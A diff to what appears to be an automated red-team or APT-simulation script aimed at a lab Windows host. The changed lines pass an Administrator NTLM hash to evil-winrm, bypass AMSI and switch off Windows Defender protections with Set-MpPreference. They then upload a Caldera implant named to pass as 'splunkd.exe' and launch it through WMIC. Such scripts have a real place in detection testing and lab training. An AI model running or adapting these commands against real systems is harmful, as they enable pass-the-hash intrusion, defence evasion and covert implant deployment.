@@ -201,7 +201,7 @@ log(f"{Fore.CYAN}🔐 Authenticating as Administrator...{Style.RESET_ALL}\n")
 run_command(f"nxc smb 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}'")
 
 log(f"\n{Fore.CYAN}🖥️  Testing interactive shell access via Evil-WinRM...{Style.RESET_ALL}\n")
-run_command(f"echo -e 'whoami\nexit' | evil-winrm -i 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}' || return 0")
+run_command(f"printf 'whoami\nexit' | evil-winrm -i 192.168.56.10 -u 'Administrator' -H '{admin_ntlm}' || return 0")
 
 print_step_header(10, "Caldera Implant Deployment")
 log(f"{Fore.CYAN}🔻 Downloading Sandcat agent from Caldera server...{Style.RESET_ALL}")
@@ -218,8 +218,7 @@ log(f"{Fore.CYAN}   └─ Disabling Windows Defender{Style.RESET_ALL}")
 log(f"{Fore.CYAN}   └─ Bypassing AMSI{Style.RESET_ALL}")
 log(f"{Fore.CYAN}   └─ Uploading to: C:\\Program Files\\splunkd.exe{Style.RESET_ALL}")
 log(f"{Fore.CYAN}   └─ Spawning process via WMIC{Style.RESET_ALL}\n")
-run_command(f'echo -e \'cd "/Program Files"\\nBypass-4MSI\\nSet-MpPreference -DisableIntrusionPreventionSystem 1;Set-MpPreference -DisableIOAVProtection 1;Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -DisableScriptScanning 1;Set-MpPreference -EnableControlledFolderAccess Disabled;\\nStart-Sleep -Seconds 5\\nexit\\n\' | evil-winrm -i 192.168.56.10 -u \'Administrator\' -H \'{admin_hash.group(2)}\'')
-run_command(f'echo -e \'upload splunkd.exe\\nStart-Sleep -Seconds 5\\nwmic process call create "C:\\Program Files\\splunkd.exe"\\nStart-Sleep -Seconds 30\\nexit\\n\' | evil-winrm -i 192.168.56.10 -u \'Administrator\' -H \'{admin_hash.group(2)}\'')
+run_command(f'printf \'cd "/Program Files"\\nBypass-4MSI\\nSet-MpPreference -DisableIntrusionPreventionSystem 1;Set-MpPreference -DisableIOAVProtection 1;Set-MpPreference -DisableRealtimeMonitoring 1;Set-MpPreference -DisableScriptScanning 1;Set-MpPreference -EnableControlledFolderAccess Disabled;\\nStart-Sleep -Seconds 5\\nupload splunkd.exe\\nStart-Sleep -Seconds 5\\nwmic process call create "C:\\Program Files\\splunkd.exe"\\nStart-Sleep -Seconds 30\\nexit\\n\' | evil-winrm -i 192.168.56.10 -u \'Administrator\' -H \'{admin_hash.group(2)}\'')
 
 print_step_header(11, "Caldera C2 Operation - APT Simulation")
 log(f"{Fore.CYAN}⚙️  Initializing Caldera API connection...{Style.RESET_ALL}")
